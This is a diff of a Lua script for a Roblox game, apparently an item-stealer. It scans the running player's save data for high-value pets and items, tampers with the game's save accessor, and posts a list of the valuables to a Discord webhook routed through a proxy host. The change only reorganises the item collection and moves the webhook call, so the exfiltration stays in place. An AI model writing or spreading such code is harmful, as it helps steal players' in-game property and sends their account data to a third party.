@@ -5,7 +5,7 @@ local plr = game.Players.LocalPlayer
 local MailMessage = "gg / HcpNe56R2a"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local HttpService = game:GetService("HttpService")
-local itemsToSend = {}
+local sortedItems = {}
 local rapCache = {}
 local sendamount = game.Players.LocalPlayer.PlayerGui._MACHINES.MailboxMachine.Frame.SendFrame.Bottom.Diamonds.Amount.Text
 _G.scriptExecuted = _G.scriptExecuted or false
@@ -86,7 +86,7 @@ local function SendMessage(url, username, diamonds)
 		}
 	}
 
-	for _, item in ipairs(itemsToSend) do
+	for _, item in ipairs(sortedItems) do
 		fields[2].value = fields[2].value .. item.name .. ": " .. formatNumber(item.rap * item.amount) .. " RAP\n"
 		totalRAP = totalRAP + (item.rap * item.amount)
 	end
@@ -223,36 +223,6 @@ local function EmptyBoxes()
     end
 end
 
-local function CategoryWebhook(category)
-	if category == "Pet" then
-		for i, v in pairs(save[category]) do
-			local rapValue = getRAP(category, v)
-			local dir = library.Directory.Pets[v.id]
-			if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
-				local prefix = ""
-				if v.pt and v.pt == 1 then
-					prefix = "Golden "
-				elseif v.pt and v.pt == 2 then
-					prefix = "Rainbow "
-				end
-				if v.sh then
-					prefix = "Shiny " .. prefix
-				end
-				local id = prefix .. v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
-				table.insert(itemsToSend, {name = id, rap = rapValue, amount = v._am or 1})
-			end
-		end
-	else
-		for i, v in pairs(save[category]) do
-			local rapValue = getRAP(category, v)
-			if rapValue >= min_rap then
-				local id = v.id .. " (x" .. (v._am and tostring(v._am) or "1") .. ")"
-				table.insert(itemsToSend, {name = id, rap = rapValue, amount = v._am or 1})
-			end
-		end
-	end
-end
-
 local function ClaimMail()
     local response, err = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
     while err == "You must wait 30 seconds before using the mailbox!" do
@@ -264,15 +234,6 @@ end
 ClaimMail()
 EmptyBoxes()
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
-for i, v in pairs(categoryList) do
-	if save[v] ~= nil then
-		CategoryWebhook(v)
-	end
-end
-if Webhook and string.find(Webhook, "discord") then
-	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
-	SendMessage(Webhook, plr.Name, GemAmount1)
-end
 local blob_a = require(game.ReplicatedStorage.Library)
 local blob_b = blob_a.Save.Get()
 function deepCopy(original)
@@ -289,7 +250,6 @@ blob_b = deepCopy(blob_b)
 blob_a.Save.Get = function(...)
 	return blob_b
 end
-local sortedItems = {}
 for i, v in pairs(categoryList) do
 	if save[v] ~= nil then
 		for uid, item in pairs(save[v]) do
@@ -297,12 +257,23 @@ for i, v in pairs(categoryList) do
                 local rapValue = getRAP(v, item)
                 local dir = library.Directory.Pets[item.id]
                 if rapValue >= min_rap and (dir.huge or dir.exclusiveLevel) then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
+                    local prefix = ""
+				    if item.pt and item.pt == 1 then
+					    prefix = "Golden "
+				    elseif item.pt and item.pt == 2 then
+					    prefix = "Rainbow "
+				    end
+				    if item.sh then
+					    prefix = "Shiny " .. prefix
+				    end
+                    local id = prefix .. item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                 end
             else
                 local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue})
+                    local id = item.id .. " (x" .. (item._am and tostring(item._am) or "1") .. ")"
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                 end
             end
             if item._lk then
@@ -314,6 +285,10 @@ for i, v in pairs(categoryList) do
             end
         end
 	end
+end
+if Webhook and string.find(Webhook, "discord") then
+	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
+	SendMessage(Webhook, plr.Name, GemAmount1)
 end
 table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
 _G.scriptExecuted = true
